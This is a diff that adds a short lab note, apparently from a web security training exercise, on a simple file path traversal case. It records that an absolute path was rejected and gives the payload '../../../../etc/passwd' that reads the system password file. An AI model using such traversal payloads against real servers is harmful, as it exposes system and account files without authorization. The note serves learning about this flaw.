@@ -1,0 +1,14 @@
+Lab #1: File path traversal, simple case
+
+End goal: Retrieve the contents of the /etc/passwd File
+
+Analysis:
+
+filename = /etc/passwd ==> 404 bad request
+--> Not accept absolute path, currently in the image folder 
+
+current position: filename = /var/www/images/65.jpg
+
+filename = ../../../../etc/passwd
+
+/etc/passwd
